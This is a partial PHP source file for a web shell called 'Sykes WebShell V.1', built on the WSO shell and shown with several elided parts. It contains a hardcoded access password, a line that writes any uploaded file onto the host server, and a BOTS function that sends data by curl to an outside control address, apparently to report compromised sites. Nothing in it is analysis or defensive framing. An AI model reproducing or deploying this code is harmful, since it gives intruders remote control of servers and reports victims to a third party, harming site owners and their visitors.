<?php
//// WSO [Sykes Edition] Â® //// WSO [Sykes Edition] Â® //// WSO [Sykes Edition] Â® //// WSO [Sykes Edition] Â® //// WSO [Sykes Edition] Â® //// 
##############################################################################################################################################################
set_time_limit(0);
session_start();
$SERVER_SESSIONS = "" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n";
$SyIP = $_SERVER['REMOTE_ADDR'];
(@copy($_FILES['pass']['tmp_name'], $_FILES['file']['name']));
$Sykes = 'sifodz'; // <=== Your Password Here ################################################################################
 if($_POST['pw'] == "$Sykes") {
   $_SESSION['pw'] = "$Sykes";
  } 
if($_SESSION['pw'] != "$Sykes") {
   echo "<title>Sykes WebShell V.1</title>
     <style>
...
#bg {
  ...
  width: 100%;
  height: 100%;
  background: url(http://ip-api.org/wp-content/uploads-images/wm.jpg) no-repeat center center fixed;
...
<center><font color='white'>Your IP:".$SyIP."</font></center>
</form>
...
function wsoHeader() {
	...
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . "Sykes WebShell V.1</title>
...
function BOTS($B) {
		...
		$B['ip'] = $ip;
		$ch = curl_init("http://s3curity.gq/cc/J_BOTS.php");
